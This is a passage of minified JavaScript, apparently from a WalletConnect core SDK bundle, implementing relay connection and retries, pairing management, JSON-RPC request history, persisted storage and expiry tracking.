handleBatchMessageEvents(e){if(e?.length===0){this.logger.trace("Batch message events is empty. Ignoring...");return}const n=e.sort((r,i)=>r.publishedAt-i.publishedAt);this.logger.debug(`Batch of ${n.length} message events sorted`);for(const r of n)try{await this.onMessageEvent(r)}catch(i){this.logger.warn(i,"Error while processing batch message event: "+i?.message)}this.logger.trace(`Batch of ${n.length} message events processed`)}async onLinkMessageEvent(e,n){const{topic:r}=e;if(!n.sessionExists){const i=Ii(Ye.FIVE_MINUTES),s={topic:r,expiry:i,relay:{protocol:"irn"},active:!1};await this.core.pairing.pairings.set(r,s)}this.events.emit(Ri.message,e),await this.recordMessageEvent(e,GT.inbound)}async connect(e){await this.confirmOnlineStateOrThrow(),e&&e!==this.relayUrl&&(this.relayUrl=e,await this.transportDisconnect()),this.connectionAttemptInProgress=!0,this.transportExplicitlyClosed=!1;let n=1;for(;n<6;){try{if(this.transportExplicitlyClosed)break;this.logger.debug({},`Connecting to ${this.relayUrl}, attempt: ${n}...`),await this.createProvider(),await new Promise(async(r,i)=>{const s=()=>{i(new Error("Connection interrupted while trying to connect"))};this.provider.once(Ec.disconnect,s),await jl(new Promise((o,a)=>{this.provider.connect().then(o).catch(a)}),this.connectTimeout,`Socket stalled when trying to connect to ${this.relayUrl}`).catch(o=>{i(o)}).finally(()=>{this.provider.off(Ec.disconnect,s),clearTimeout(this.reconnectTimeout)}),await new Promise(async(o,a)=>{const c=()=>{i(new Error("Connection interrupted while trying to subscribe"))};this.provider.once(Ec.disconnect,c),await this.subscriber.start().then(o).catch(a).finally(()=>{this.provider.off(Ec.disconnect,c)})}),this.hasExperiencedNetworkDisruption=!1,r()})}catch(r){await this.subscriber.stop();const i=r;this.logger.warn({},i.message),this.hasExperiencedNetworkDisruption=!0}finally{this.connectionAttemptInProgress=!1}if(this.connected){this.logger.debug({},`Connected to ${this.relayUrl} successfully on attempt: ${n}`);break}await new Promise(r=>setTimeout(r,Ye.toMiliseconds(n*1))),n++}}startPingTimeout(){var e,n,r,i,s;if(Px())try{(n=(e=this.provider)==null?void 0:e.connection)!=null&&n.socket&&((s=(i=(r=this.provider)==null?void 0:r.connection)==null?void 0:i.socket)==null||s.on("ping",()=>{this.resetPingTimeout()})),this.resetPingTimeout()}catch(o){this.logger.warn(o,o?.message)}}async createProvider(){this.provider.connection&&this.unregisterProviderListeners();const e=await this.core.crypto.signJWT(this.relayUrl);this.provider=new UB(new ZTe(w6e({sdkVersion:v7,protocol:this.protocol,version:this.version,relayUrl:this.relayUrl,projectId:this.projectId,auth:e,useOnCloseEvent:!0,bundleId:this.bundleId,packageName:this.packageName}))),this.registerProviderListeners()}async recordMessageEvent(e,n){const{topic:r,message:i}=e;await this.messages.set(r,i,n)}async shouldIgnoreMessageEvent(e){const{topic:n,message:r}=e;if(!r||r.length===0)return this.logger.warn(`Ignoring invalid/empty message: ${r}`),!0;if(!await this.subscriber.isKnownTopic(n))return this.logger.warn(`Ignoring message for unknown topic ${n}`),!0;const i=this.messages.has(n,r);return i&&this.logger.warn(`Ignoring duplicate message: ${r}`),i}async onProviderPayload(e){if(this.logger.debug("Incoming Relay Payload"),this.logger.trace({type:"payload",direction:"incoming",payload:e}),MB(e)){if(!e.method.endsWith(uxe))return;const n=e.params,{topic:r,message:i,publishedAt:s,attestation:o}=n.data,a={topic:r,message:i,publishedAt:s,transportType:Or.relay,attestation:o};this.logger.debug("Emitting Relayer Payload"),this.logger.trace(rV({type:"event",event:n.id},a)),this.events.emit(n.id,a),await this.acknowledgePayload(e),await this.onMessageEvent(a)}else o8(e)&&this.events.emit(Ri.message_ack,e)}async onMessageEvent(e){await this.shouldIgnoreMessageEvent(e)||(await this.recordMessageEvent(e,GT.inbound),this.events.emit(Ri.message,e))}async acknowledgePayload(e){const n=d_(e.id,!0);await this.provider.connection.send(n)}unregisterProviderListeners(){this.provider.off(Ec.payload,this.onPayloadHandler),this.provider.off(Ec.connect,this.onConnectHandler),this.provider.off(Ec.disconnect,this.onDisconnectHandler),this.provider.off(Ec.error,this.onProviderErrorHandler),clearTimeout(this.pingTimeout)}async registerEventListeners(){let e=await Bq();mTe(async n=>{e!==n&&(e=n,n?await this.transportOpen().catch(r=>this.logger.error(r,r?.message)):(this.hasExperiencedNetworkDisruption=!0,await this.transportDisconnect(),this.transportExplicitlyClosed=!1))}),this.core.heartbeat.on(Fg.pulse,async()=>{if(!this.transportExplicitlyClosed&&!this.connected&&bTe())try{await this.confirmOnlineStateOrThrow(),await this.transportOpen()}catch(n){this.logger.warn(n,n?.message)}})}async onProviderDisconnect(){clearTimeout(this.pingTimeout),this.events.emit(Ri.disconnect),this.connectionAttemptInProgress=!1,!this.reconnectInProgress&&(this.reconnectInProgress=!0,await this.subscriber.stop(),this.subscriber.hasAnyTopics&&(this.transportExplicitlyClosed||(this.reconnectTimeout=setTimeout(async()=>{await this.transportOpen().catch(e=>this.logger.error(e,e?.message)),this.reconnectTimeout=void 0,this.reconnectInProgress=!1},Ye.toMiliseconds(lxe)))))}isInitialized(){if(!this.initialized){const{message:e}=Xe("NOT_INITIALIZED",this.name);throw new Error(e)}}async toEstablishConnection(){if(await this.confirmOnlineStateOrThrow(),!this.connected){if(this.connectPromise){await this.connectPromise;return}await this.connect()}}}function k8e(t,e){return t===e||Number.isNaN(t)&&Number.isNaN(e)}function iV(t){return Object.getOwnPropertySymbols(t).filter(e=>Object.prototype.propertyIsEnumerable.call(t,e))}function sV(t){return t==null?t===void 0?"[object Undefined]":"[object Null]":Object.prototype.toString.call(t)}const D8e="[object RegExp]",B8e="[object String]",j8e="[object Number]",M8e="[object Boolean]",oV="[object Arguments]",U8e="[object Symbol]",L8e="[object Date]",F8e="[object Map]",$8e="[object Set]",H8e="[object Array]",z8e="[object Function]",q8e="[object ArrayBuffer]",N9="[object Object]",V8e="[object Error]",W8e="[object DataView]",G8e="[object Uint8Array]",K8e="[object Uint8ClampedArray]",Z8e="[object Uint16Array]",Y8e="[object Uint32Array]",Q8e="[object BigUint64Array]",J8e="[object Int8Array]",X8e="[object Int16Array]",eRe="[object Int32Array]",tRe="[object BigInt64Array]",nRe="[object Float32Array]",rRe="[object Float64Array]";function iRe(){}function aV(t){if(!t||typeof t!="object")return!1;const e=Object.getPrototypeOf(t);return e===null||e===Object.prototype||Object.getPrototypeOf(e)===null?Object.prototype.toString.call(t)==="[object Object]":!1}function sRe(t,e,n){return K2(t,e,void 0,void 0,void 0,void 0,n)}function K2(t,e,n,r,i,s,o){const a=o(t,e,n,r,i,s);if(a!==void 0)return a;if(typeof t==typeof e)switch(typeof t){case"bigint":case"string":case"boolean":case"symbol":case"undefined":return t===e;case"number":return t===e||Object.is(t,e);case"function":return t===e;case"object":return uE(t,e,s,o)}return uE(t,e,s,o)}function uE(t,e,n,r){if(Object.is(t,e))return!0;let i=sV(t),s=sV(e);if(i===oV&&(i=N9),s===oV&&(s=N9),i!==s)return!1;switch(i){case B8e:return t.toString()===e.toString();case j8e:{const c=t.valueOf(),l=e.valueOf();return k8e(c,l)}case M8e:case L8e:case U8e:return Object.is(t.valueOf(),e.valueOf());case D8e:return t.source===e.source&&t.flags===e.flags;case z8e:return t===e}n=n??new Map;const o=n.get(t),a=n.get(e);if(o!=null&&a!=null)return o===e;n.set(t,e),n.set(e,t);try{switch(i){case F8e:{if(t.size!==e.size)return!1;for(const[c,l]of t.entries())if(!e.has(c)||!K2(l,e.get(c),c,t,e,n,r))return!1;return!0}case $8e:{if(t.size!==e.size)return!1;const c=Array.from(t.values()),l=Array.from(e.values());for(let f=0;f<c.length;f++){const h=c[f],m=l.findIndex(b=>K2(h,b,void 0,t,e,n,r));if(m===-1)return!1;l.splice(m,1)}return!0}case H8e:case G8e:case K8e:case Z8e:case Y8e:case Q8e:case J8e:case X8e:case eRe:case tRe:case nRe:case rRe:{if(typeof Buffer<"u"&&Buffer.isBuffer(t)!==Buffer.isBuffer(e)||t.length!==e.length)return!1;for(let c=0;c<t.length;c++)if(!K2(t[c],e[c],c,t,e,n,r))return!1;return!0}case q8e:return t.byteLength!==e.byteLength?!1:uE(new Uint8Array(t),new Uint8Array(e),n,r);case W8e:return t.byteLength!==e.byteLength||t.byteOffset!==e.byteOffset?!1:uE(new Uint8Array(t),new Uint8Array(e),n,r);case V8e:return t.name===e.name&&t.message===e.message;case N9:{if(!(uE(t.constructor,e.constructor,n,r)||aV(t)&&aV(e)))return!1;const c=[...Object.keys(t),...iV(t)],l=[...Object.keys(e),...iV(e)];if(c.length!==l.length)return!1;for(let f=0;f<c.length;f++){const h=c[f],m=t[h];if(!Object.hasOwn(e,h))return!1;const b=e[h];if(!K2(m,b,h,t,e,n,r))return!1}return!0}default:return!1}}finally{n.delete(t),n.delete(e)}}function oRe(t,e){return sRe(t,e,iRe)}var aRe=Object.defineProperty,cV=Object.getOwnPropertySymbols,cRe=Object.prototype.hasOwnProperty,uRe=Object.prototype.propertyIsEnumerable,x7=(t,e,n)=>e in t?aRe(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,uV=(t,e)=>{for(var n in e||(e={}))cRe.call(e,n)&&x7(t,n,e[n]);if(cV)for(var n of cV(e))uRe.call(e,n)&&x7(t,n,e[n]);return t},Ho=(t,e,n)=>x7(t,typeof e!="symbol"?e+"":e,n);class zg extends Zwe{constructor(e,n,r,i=Yl,s=void 0){super(e,n,r,i),this.core=e,this.logger=n,this.name=r,Ho(this,"map",new Map),Ho(this,"version",dxe),Ho(this,"cached",[]),Ho(this,"initialized",!1),Ho(this,"getKey"),Ho(this,"storagePrefix",Yl),Ho(this,"recentlyDeleted",[]),Ho(this,"recentlyDeletedLimit",200),Ho(this,"init",async()=>{this.initialized||(this.logger.trace("Initialized"),await this.restore(),this.cached.forEach(o=>{this.getKey&&o!==null&&!es(o)?this.map.set(this.getKey(o),o):W4e(o)?this.map.set(o.id,o):G4e(o)&&this.map.set(o.topic,o)}),this.cached=[],this.initialized=!0)}),Ho(this,"set",async(o,a)=>{this.isInitialized(),this.map.has(o)?await this.update(o,a):(this.logger.debug("Setting value"),this.logger.trace({type:"method",method:"set",key:o,value:a}),this.map.set(o,a),await this.persist())}),Ho(this,"get",o=>(this.isInitialized(),this.logger.debug("Getting value"),this.logger.trace({type:"method",method:"get",key:o}),this.getData(o))),Ho(this,"getAll",o=>(this.isInitialized(),o?this.values.filter(a=>Object.keys(o).every(c=>oRe(a[c],o[c]))):this.values)),Ho(this,"update",async(o,a)=>{this.isInitialized(),this.logger.debug("Updating value"),this.logger.trace({type:"method",method:"update",key:o,update:a});const c=uV(uV({},this.getData(o)),a);this.map.set(o,c),await this.persist()}),Ho(this,"delete",async(o,a)=>{this.isInitialized(),this.map.has(o)&&(this.logger.debug("Deleting value"),this.logger.trace({type:"method",method:"delete",key:o,reason:a}),this.map.delete(o),this.addToRecentlyDeleted(o),await this.persist())}),this.logger=aa(n,this.name),this.storagePrefix=i,this.getKey=s}get context(){return oa(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}get length(){return this.map.size}get keys(){return Array.from(this.map.keys())}get values(){return Array.from(this.map.values())}addToRecentlyDeleted(e){this.recentlyDeleted.push(e),this.recentlyDeleted.length>=this.recentlyDeletedLimit&&this.recentlyDeleted.splice(0,this.recentlyDeletedLimit/2)}async setDataStore(e){await this.core.storage.setItem(this.storageKey,e)}async getDataStore(){return await this.core.storage.getItem(this.storageKey)}getData(e){const n=this.map.get(e);if(!n){if(this.recentlyDeleted.includes(e)){const{message:i}=Xe("MISSING_OR_INVALID",`Record was recently deleted - ${this.name}: ${e}`);throw this.logger.error(i),new Error(i)}const{message:r}=Xe("NO_MATCHING_KEY",`${this.name}: ${e}`);throw this.logger.error(r),new Error(r)}return n}async persist(){await this.setDataStore(this.values)}async restore(){try{const e=await this.getDataStore();if(typeof e>"u"||!e.length)return;if(this.map.size){const{message:n}=Xe("RESTORE_WILL_OVERRIDE",this.name);throw this.logger.error(n),new Error(n)}this.cached=e,this.logger.debug(`Successfully Restored value for ${this.name}`),this.logger.trace({type:"method",method:"restore",value:this.values})}catch(e){this.logger.debug(`Failed to Restore value for ${this.name}`),this.logger.error(e)}}isInitialized(){if(!this.initialized){const{message:e}=Xe("NOT_INITIALIZED",this.name);throw new Error(e)}}}var lRe=Object.defineProperty,dRe=(t,e,n)=>e in t?lRe(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,yn=(t,e,n)=>dRe(t,typeof e!="symbol"?e+"":e,n);class fRe{constructor(e,n){this.core=e,this.logger=n,yn(this,"name",mxe),yn(this,"version",gxe),yn(this,"events",new oB),yn(this,"pairings"),yn(this,"initialized",!1),yn(this,"storagePrefix",Yl),yn(this,"ignoredPayloadTypes",[Af]),yn(this,"registeredMethods",[]),yn(this,"init",async()=>{this.initialized||(await this.pairings.init(),await this.cleanup(),this.registerRelayerEvents(),this.registerExpirerEvents(),this.initialized=!0,this.logger.trace("Initialized"))}),yn(this,"register",({methods:r})=>{this.isInitialized(),this.registeredMethods=[...new Set([...this.registeredMethods,...r])]}),yn(this,"create",async r=>{this.isInitialized();const i=y7(),s=await this.core.crypto.setSymKey(i),o=Ii(Ye.FIVE_MINUTES),a={protocol:Loe},c={topic:s,expiry:o,relay:a,active:!1,methods:r?.methods},l=Tq({protocol:this.core.protocol,version:this.core.version,topic:s,symKey:i,relay:a,expiryTimestamp:o,methods:r?.methods});return this.events.emit(xm.create,c),this.core.expirer.set(s,o),await this.pairings.set(s,c),await this.core.relayer.subscribe(s,{transportType:r?.transportType,internal:r?.internal}),{topic:s,uri:l}}),yn(this,"pair",async r=>{this.isInitialized();const i=this.core.eventClient.createEvent({properties:{topic:r?.uri,trace:[xl.pairing_started]}});this.isValidPair(r,i);const{topic:s,symKey:o,relay:a,expiryTimestamp:c,methods:l}=Sq(r.uri);i.props.properties.topic=s,i.addTrace(xl.pairing_uri_validation_success),i.addTrace(xl.pairing_uri_not_expired);let f;if(this.pairings.keys.includes(s)){if(f=this.pairings.get(s),i.addTrace(xl.existing_pairing),f.active)throw i.setError(of.active_pairing_already_exists),new Error(`Pairing already exists: ${s}. Please try again with a new connection URI.`);i.addTrace(xl.pairing_not_expired)}const h=c||Ii(Ye.FIVE_MINUTES),m={topic:s,relay:a,expiry:h,active:!1,methods:l};this.core.expirer.set(s,h),await this.pairings.set(s,m),i.addTrace(xl.store_new_pairing),r.activatePairing&&await this.activate({topic:s}),this.events.emit(xm.create,m),i.addTrace(xl.emit_inactive_pairing),this.core.crypto.keychain.has(s)||await this.core.crypto.setSymKey(o,s),i.addTrace(xl.subscribing_pairing_topic);try{await this.core.relayer.confirmOnlineStateOrThrow()}catch{i.setError(of.no_internet_connection)}try{await this.core.relayer.subscribe(s,{relay:a})}catch(b){throw i.setError(of.subscribe_pairing_topic_failure),b}return i.addTrace(xl.subscribe_pairing_topic_success),m}),yn(this,"activate",async({topic:r})=>{this.isInitialized();const i=Ii(Ye.FIVE_MINUTES);this.core.expirer.set(r,i),await this.pairings.update(r,{active:!0,expiry:i})}),yn(this,"ping",async r=>{this.isInitialized(),await this.isValidPing(r),this.logger.warn("ping() is deprecated and will be removed in the next major release.");const{topic:i}=r;if(this.pairings.keys.includes(i)){const s=await this.sendRequest(i,"wc_pairingPing",{}),{done:o,resolve:a,reject:c}=Am();this.events.once(Jn("pairing_ping",s),({error:l})=>{l?c(l):a()}),await o()}}),yn(this,"updateExpiry",async({topic:r,expiry:i})=>{this.isInitialized(),await this.pairings.update(r,{expiry:i})}),yn(this,"updateMetadata",async({topic:r,metadata:i})=>{this.isInitialized(),await this.pairings.update(r,{peerMetadata:i})}),yn(this,"getPairings",()=>(this.isInitialized(),this.pairings.values)),yn(this,"disconnect",async r=>{this.isInitialized(),await this.isValidDisconnect(r);const{topic:i}=r;this.pairings.keys.includes(i)&&(await this.sendRequest(i,"wc_pairingDelete",Ur("USER_DISCONNECTED")),await this.deletePairing(i))}),yn(this,"formatUriFromPairing",r=>{this.isInitialized();const{topic:i,relay:s,expiry:o,methods:a}=r,c=this.core.crypto.keychain.get(i);return Tq({protocol:this.core.protocol,version:this.core.version,topic:i,symKey:c,relay:s,expiryTimestamp:o,methods:a})}),yn(this,"sendRequest",async(r,i,s)=>{const o=Iu(i,s),a=await this.core.crypto.encode(r,o),c=Rv[i].req;return this.core.history.set(r,o),this.core.relayer.publish(r,a,c),o.id}),yn(this,"sendResult",async(r,i,s)=>{const o=d_(r,s),a=await this.core.crypto.encode(i,o),c=(await this.core.history.get(i,r)).request.method,l=Rv[c].res;await this.core.relayer.publish(i,a,l),await this.core.history.resolve(o)}),yn(this,"sendError",async(r,i,s)=>{const o=s8(r,s),a=await this.core.crypto.encode(i,o),c=(await this.core.history.get(i,r)).request.method,l=Rv[c]?Rv[c].res:Rv.unregistered_method.res;await this.core.relayer.publish(i,a,l),await this.core.history.resolve(o)}),yn(this,"deletePairing",async(r,i)=>{await this.core.relayer.unsubscribe(r),await Promise.all([this.pairings.delete(r,Ur("USER_DISCONNECTED")),this.core.crypto.deleteSymKey(r),i?Promise.resolve():this.core.expirer.del(r)])}),yn(this,"cleanup",async()=>{const r=this.pairings.getAll().filter(i=>Ol(i.expiry));await Promise.all(r.map(i=>this.deletePairing(i.topic)))}),yn(this,"onRelayEventRequest",async r=>{const{topic:i,payload:s}=r;switch(s.method){case"wc_pairingPing":return await this.onPairingPingRequest(i,s);case"wc_pairingDelete":return await this.onPairingDeleteRequest(i,s);default:return await this.onUnknownRpcMethodRequest(i,s)}}),yn(this,"onRelayEventResponse",async r=>{const{topic:i,payload:s}=r,o=(await this.core.history.get(i,s.id)).request.method;switch(o){case"wc_pairingPing":return this.onPairingPingResponse(i,s);default:return this.onUnknownRpcMethodResponse(o)}}),yn(this,"onPairingPingRequest",async(r,i)=>{const{id:s}=i;try{this.isValidPing({topic:r}),await this.sendResult(s,r,!0),this.events.emit(xm.ping,{id:s,topic:r})}catch(o){await this.sendError(s,r,o),this.logger.error(o)}}),yn(this,"onPairingPingResponse",(r,i)=>{const{id:s}=i;setTimeout(()=>{Rl(i)?this.events.emit(Jn("pairing_ping",s),{}):Nc(i)&&this.events.emit(Jn("pairing_ping",s),{error:i.error})},500)}),yn(this,"onPairingDeleteRequest",async(r,i)=>{const{id:s}=i;try{this.isValidDisconnect({topic:r}),await this.deletePairing(r),this.events.emit(xm.delete,{id:s,topic:r})}catch(o){await this.sendError(s,r,o),this.logger.error(o)}}),yn(this,"onUnknownRpcMethodRequest",async(r,i)=>{const{id:s,method:o}=i;try{if(this.registeredMethods.includes(o))return;const a=Ur("WC_METHOD_UNSUPPORTED",o);await this.sendError(s,r,a),this.logger.error(a)}catch(a){await this.sendError(s,r,a),this.logger.error(a)}}),yn(this,"onUnknownRpcMethodResponse",r=>{this.registeredMethods.includes(r)||this.logger.error(Ur("WC_METHOD_UNSUPPORTED",r))}),yn(this,"isValidPair",(r,i)=>{var s;if(!Wo(r)){const{message:a}=Xe("MISSING_OR_INVALID",`pair() params: ${r}`);throw i.setError(of.malformed_pairing_uri),new Error(a)}if(!V4e(r.uri)){const{message:a}=Xe("MISSING_OR_INVALID",`pair() uri: ${r.uri}`);throw i.setError(of.malformed_pairing_uri),new Error(a)}const o=Sq(r?.uri);if(!((s=o?.relay)!=null&&s.protocol)){const{message:a}=Xe("MISSING_OR_INVALID","pair() uri#relay-protocol");throw i.setError(of.malformed_pairing_uri),new Error(a)}if(!(o!=null&&o.symKey)){const{message:a}=Xe("MISSING_OR_INVALID","pair() uri#symKey");throw i.setError(of.malformed_pairing_uri),new Error(a)}if(o!=null&&o.expiryTimestamp&&Ye.toMiliseconds(o?.expiryTimestamp)<Date.now()){i.setError(of.pairing_expired);const{message:a}=Xe("EXPIRED","pair() URI has expired. Please try again with a new connection URI.");throw new Error(a)}}),yn(this,"isValidPing",async r=>{if(!Wo(r)){const{message:s}=Xe("MISSING_OR_INVALID",`ping() params: ${r}`);throw new Error(s)}const{topic:i}=r;await this.isValidPairingTopic(i)}),yn(this,"isValidDisconnect",async r=>{if(!Wo(r)){const{message:s}=Xe("MISSING_OR_INVALID",`disconnect() params: ${r}`);throw new Error(s)}const{topic:i}=r;await this.isValidPairingTopic(i)}),yn(this,"isValidPairingTopic",async r=>{if(!Ni(r,!1)){const{message:i}=Xe("MISSING_OR_INVALID",`pairing topic should be a string: ${r}`);throw new Error(i)}if(!this.pairings.keys.includes(r)){const{message:i}=Xe("NO_MATCHING_KEY",`pairing topic doesn't exist: ${r}`);throw new Error(i)}if(Ol(this.pairings.get(r).expiry)){await this.deletePairing(r);const{message:i}=Xe("EXPIRED",`pairing topic: ${r}`);throw new Error(i)}}),this.core=e,this.logger=aa(n,this.name),this.pairings=new zg(this.core,this.logger,this.name,this.storagePrefix)}get context(){return oa(this.logger)}isInitialized(){if(!this.initialized){const{message:e}=Xe("NOT_INITIALIZED",this.name);throw new Error(e)}}registerRelayerEvents(){this.core.relayer.on(Ri.message,async e=>{const{topic:n,message:r,transportType:i}=e;if(this.pairings.keys.includes(n)&&i!==Or.link_mode&&!this.ignoredPayloadTypes.includes(this.core.crypto.getPayloadType(r)))try{const s=await this.core.crypto.decode(n,r);MB(s)?(this.core.history.set(n,s),await this.onRelayEventRequest({topic:n,payload:s})):o8(s)&&(await this.core.history.resolve(s),await this.onRelayEventResponse({topic:n,payload:s}),this.core.history.delete(n,s.id)),await this.core.relayer.messages.ack(n,r)}catch(s){this.logger.error(s)}})}registerExpirerEvents(){this.core.expirer.on(Ic.expired,async e=>{const{topic:n}=Pse(e.target);n&&this.pairings.keys.includes(n)&&(await this.deletePairing(n,!0),this.events.emit(xm.expire,{topic:n}))})}}var hRe=Object.defineProperty,pRe=(t,e,n)=>e in t?hRe(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,ys=(t,e,n)=>pRe(t,typeof e!="symbol"?e+"":e,n);class mRe extends Vwe{constructor(e,n){super(e,n),this.core=e,this.logger=n,ys(this,"records",new Map),ys(this,"events",new Wc.EventEmitter),ys(this,"name",yxe),ys(this,"version",bxe),ys(this,"cached",[]),ys(this,"initialized",!1),ys(this,"storagePrefix",Yl),ys(this,"init",async()=>{this.initialized||(this.logger.trace("Initialized"),await this.restore(),this.cached.forEach(r=>this.records.set(r.id,r)),this.cached=[],this.registerEventListeners(),this.initialized=!0)}),ys(this,"set",(r,i,s)=>{if(this.isInitialized(),this.logger.debug("Setting JSON-RPC request history record"),this.logger.trace({type:"method",method:"set",topic:r,request:i,chainId:s}),this.records.has(i.id))return;const o={id:i.id,topic:r,request:{method:i.method,params:i.params||null},chainId:s,expiry:Ii(Ye.THIRTY_DAYS)};this.records.set(o.id,o),this.persist(),this.events.emit(fu.created,o)}),ys(this,"resolve",async r=>{if(this.isInitialized(),this.logger.debug("Updating JSON-RPC response history record"),this.logger.trace({type:"method",method:"update",response:r}),!this.records.has(r.id))return;const i=await this.getRecord(r.id);typeof i.response>"u"&&(i.response=Nc(r)?{error:r.error}:{result:r.result},this.records.set(i.id,i),this.persist(),this.events.emit(fu.updated,i))}),ys(this,"get",async(r,i)=>(this.isInitialized(),this.logger.debug("Getting record"),this.logger.trace({type:"method",method:"get",topic:r,id:i}),await this.getRecord(i))),ys(this,"delete",(r,i)=>{this.isInitialized(),this.logger.debug("Deleting record"),this.logger.trace({type:"method",method:"delete",id:i}),this.values.forEach(s=>{if(s.topic===r){if(typeof i<"u"&&s.id!==i)return;this.records.delete(s.id),this.events.emit(fu.deleted,s)}}),this.persist()}),ys(this,"exists",async(r,i)=>(this.isInitialized(),this.records.has(i)?(await this.getRecord(i)).topic===r:!1)),ys(this,"on",(r,i)=>{this.events.on(r,i)}),ys(this,"once",(r,i)=>{this.events.once(r,i)}),ys(this,"off",(r,i)=>{this.events.off(r,i)}),ys(this,"removeListener",(r,i)=>{this.events.removeListener(r,i)}),this.logger=aa(n,this.name)}get context(){return oa(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}get size(){return this.records.size}get keys(){return Array.from(this.records.keys())}get values(){return Array.from(this.records.values())}get pending(){const e=[];return this.values.forEach(n=>{if(typeof n.response<"u")return;const r={topic:n.topic,request:Iu(n.request.method,n.request.params,n.id),chainId:n.chainId};return e.push(r)}),e}async setJsonRpcRecords(e){await this.core.storage.setItem(this.storageKey,e)}async getJsonRpcRecords(){return await this.core.storage.getItem(this.storageKey)}getRecord(e){this.isInitialized();const n=this.records.get(e);if(!n){const{message:r}=Xe("NO_MATCHING_KEY",`${this.name}: ${e}`);throw new Error(r)}return n}async persist(){await this.setJsonRpcRecords(this.values),this.events.emit(fu.sync)}async restore(){try{const e=await this.getJsonRpcRecords();if(typeof e>"u"||!e.length)return;if(this.records.size){const{message:n}=Xe("RESTORE_WILL_OVERRIDE",this.name);throw this.logger.error(n),new Error(n)}this.cached=e,this.logger.debug(`Successfully Restored records for ${this.name}`),this.logger.trace({type:"method",method:"restore",records:this.values})}catch(e){this.logger.debug(`Failed to Restore records for ${this.name}`),this.logger.error(e)}}registerEventListeners(){this.events.on(fu.created,e=>{const n=fu.created;this.logger.info(`Emitting ${n}`),this.logger.debug({type:"event",event:n,record:e})}),this.events.on(fu.updated,e=>{const n=fu.updated;this.logger.info(`Emitting ${n}`),this.logger.debug({type:"event",event:n,record:e})}),this.events.on(fu.deleted,e=>{const n=fu.deleted;this.logger.info(`Emitting ${n}`),this.logger.debug({type:"event",event:n,record:e})}),this.core.heartbeat.on(Fg.pulse,()=>{this.cleanup()})}cleanup(){try{this.isInitialized();let e=!1;this.records.forEach(n=>{Ye.toMiliseconds(n.expiry||0)-Date.now()<=0&&(this.logger.info(`Deleting expired history log: ${n.id}`),this.records.delete(n.id),this.events.emit(fu.deleted,n,!1),e=!0)}),e&&this.persist()}catch(e){this.logger.warn(e)}}isInitialized(){if(!this.initialized){const{message:e}=Xe("NOT_INITIALIZED",this.name);throw new Error(e)}}}var gRe=Object.defineProperty,yRe=(t,e,n)=>e in t?gRe(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,Hs=(t,e,n)=>yRe(t,typeof e!="symbol"?e+"":e,n);class bRe extends Qwe{constructor(e,n){super(e,n),this.core=e,this.logger=n,Hs(this,"expirations",new Map),Hs(this,"events",new Wc.EventEmitter),Hs(this,"name",wxe),Hs(this,"version",vxe),Hs(this,"cached",[]),Hs(this,"initialized",!1),Hs(this,"storagePrefix",Yl),Hs(this,"init",async()=>{this.initialized||(this.logger.trace("Initialized"),await this.restore(),this.cached.forEach(r=>this.expirations.set(r.target,r)),this.cached=[],this.registerEventListeners(),this.initialized=!0)}),Hs(this,"has",r=>{try{const i=this.formatTarget(r);return typeof this.getExpiration(i)<"u"}catch{return!1}}),Hs(this,"set",(r,i)=>{this.isInitialized();const s=this.formatTarget(r),o={target:s,expiry:i};this.expirations.set(s,o),this.checkExpiry(s,o),this.events.emit(Ic.created,{target:s,expiration:o})}),Hs(this,"get",r=>{this.isInitialized();const i=this.formatTarget(r);return this.getExpiration(i)}),Hs(this,"del",r=>{if(this.isInitialized(),this.has(r)){const i=this.formatTarget(r),s=this.getExpiration(i);this.expirations.delete(i),this.events.emit(Ic.deleted,{target:i,expiration:s})}}),Hs(this,"on",(r,i)=>{this.events.on(r,i)}),Hs(this,"once",(r,i)=>{this.events.once(r,i)}),Hs(this,"off",(r,i)=>{this.events.off(r,i)}),Hs(this,"removeListener",(r,i)=>{this.events.removeListener(r,i)}),this.logger=aa(n,this.name)}get context(){return oa(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}get length(){return this.expirations.size}get keys(){return Array.from(this.expirations.keys())}get values(){return Array.from(this.expirations.values())}formatTarget(e){if(typeof e=="string")return v6e(e);if(typeof e=="number")return E6e(e);const{message:n}=Xe("UNKNOWN_TYPE",`Target type: ${typeof e}`);throw new Error(n)}async setExpirations(e){await this.core.storage.setItem(this.storageKey,e)}async getExpirations(){return await this.core.storage.getItem(this.storageKey)}async persist(){await this.setExpirations(this.values),this.events.emit(Ic.sync)}async restore(){try{const e=await this.getExpirations();if(typeof e>"u"||!e.length)return;if(this.expirations.size){const{message:n}=Xe("RESTORE_WILL_OVERRIDE",this.name);throw this.logger.error(n),new Error(n)}this.cached=e,this.logger.debug(`Successfully Restored expirations for ${this.name}`),this.logger.trace({type:"method",method:"restore",expirations:this.values})}catch(e){this.logger.debug(`Failed to Restore expirations for ${this.name}`),this.logger.error(e)}}getExpiration(e){const n=this.expirations.get(e);if(!n){const{message:r}=Xe("NO_MATCHING_KEY",`${this.name}: ${e}`);throw this.logger.warn(r),new Error(r)}return n}checkExpiry(e,n){const{expiry:r}=n;Ye.toMiliseconds(r)-Date.now()<=0&&this.expire(e,n)}expire(e,n){this.expirations.delete(e),this.events.emit(Ic.expired,{target:e,expiration:n})}checkExpirations(){this.core.relayer.connected&&this.expirations.forEach((e,n)=>this.checkExpiry(n,e))}registerEventListeners(){this.core.heartbeat.on(Fg.pulse,()=>this.checkExpirations()),this.events.on(Ic.created,e=>{const n=Ic.created;this.logger.info(`Emitting ${n}`),this.logger.debug({type:"event",event:n,data:e}),this.persist()}),this.events.on(Ic.expired,e=>{const n=Ic.expired;this.logger.info(`Emitting ${n}`),this.logger.debug({type:"event",event:n,data:e}),this.persist()}),this.events.on(Ic.deleted,e=>{const n=Ic.deleted;this.logger.info(`Emitting ${n}`),this.logger.debug({type:"event",event:n,data:e}),this.persist()})}isInitialized(){if(!this.initialized){const{message:e}=Xe("NOT_INITIALIZED",this.name);throw new Error(e)}}}var wRe=Object.defineProperty,vRe=(t,e,n)=>e in 